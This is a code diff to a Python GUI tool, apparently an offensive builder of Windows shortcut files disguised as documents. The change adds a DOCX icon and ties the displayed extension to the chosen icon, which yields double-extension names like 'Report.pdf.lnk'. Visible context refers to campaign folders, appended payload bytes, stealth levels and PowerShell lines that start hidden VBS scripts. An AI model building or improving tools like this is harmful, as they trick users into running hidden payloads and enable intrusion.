@@ -32,6 +32,7 @@ class GhostLNKGUI(QMainWindow):
         "PDF Document - Edge Index 11": (r"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe", 11, ".pdf"),
         "PDF Document - Generic": (r"C:\Windows\System32\SHELL32.dll", 1, ".pdf"),
         "Word Document": (r"C:\Windows\System32\SHELL32.dll", 1, ".doc"),
+        "Word Document - DOCX": (r"C:\Windows\System32\SHELL32.dll", 1, ".docx"),
         "Excel Spreadsheet - Generic": (r"C:\Windows\System32\SHELL32.dll", 1, ".xls"),
         "Text Document": (r"C:\Windows\System32\notepad.exe", 0, ".txt"),
         "PowerShell Script": (r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", 0, ".ps1"),
@@ -44,6 +45,7 @@ class GhostLNKGUI(QMainWindow):
         "PDF Document - Edge Index 11": "pdf-edge.svg",
         "PDF Document - Generic": "pdf-generic.svg",
         "Word Document": "word.svg",
+        "Word Document - DOCX": "word.svg",
         "Excel Spreadsheet - Generic": "excel.svg",
         "Text Document": "text.svg",
         "PowerShell Script": "powershell.svg",
@@ -607,7 +609,11 @@ class GhostLNKGUI(QMainWindow):
         file_layout.addWidget(self.filename_input, 0, 1)
         file_layout.addWidget(QLabel("Extension:"), 1, 0)
         self.ext_combo = QComboBox()
-        self.ext_combo.addItems([".pdf", ".doc", ".xls", ".txt", ".ps1"])
+        extensions = list(dict.fromkeys([entry[2] for entry in self.ICON_DATABASE.values()] + [""]))
+        for extension in extensions:
+            self.ext_combo.addItem(extension or "(no extension)", extension)
+        self.icon_combo.currentIndexChanged.connect(self.on_icon_changed)
+        self.on_icon_changed()
         file_layout.addWidget(self.ext_combo, 1, 1)
         self.lnk_cb = QCheckBox("Add .lnk extension")
         self.lnk_cb.setChecked(True)
@@ -968,7 +974,7 @@ Start-Process -FilePath "$f\\helper.vbs" -WindowStyle Hidden
         icon = self.icon_combo.currentData()
         icon_path, icon_idx, _ = self.ICON_DATABASE[icon]
         name = self.filename_input.text().strip() or "Report"
-        ext_choice = self.ext_combo.currentText()
+        ext_choice = self.ext_combo.currentData()
         filename = f"{name}{ext_choice}.lnk"
         lnk_path = os.path.join(campaign_dir, filename)
         desc = self.desc_input.toPlainText().strip() or "PDF Document"
@@ -1397,9 +1403,9 @@ Start-Process -FilePath "$f\\update.vbs" -WindowStyle Hidden;
                         appended_payload = getattr(self, 'appended_payload_bytes', None)
 
             icon = self.icon_combo.currentData()
-            icon_path, icon_idx, ext = self.ICON_DATABASE[icon]
+            icon_path, icon_idx, _ = self.ICON_DATABASE[icon]
             name = self.filename_input.text().strip() or "Document"
-            ext_choice = self.ext_combo.currentText()
+            ext_choice = self.ext_combo.currentData()
             filename = f"{name}{ext_choice}"
             if self.lnk_cb.isChecked():
                 filename += ".lnk"
@@ -1517,6 +1523,12 @@ Start-Process -FilePath "$f\\update.vbs" -WindowStyle Hidden;
         stealth_names = ["None", "Moderate", "Maximum"]
         self.stealth_indicator.setText(f"Stealth: {stealth_names[stealth]}")
         self.update_options()
+
+    def on_icon_changed(self):
+        icon = self.icon_combo.currentData()
+        if icon:
+            extension = self.ICON_DATABASE[icon][2]
+            self.ext_combo.setCurrentIndex(self.ext_combo.findData(extension))
 
     def on_url_changed(self):
         url = self.url_input.text().strip()
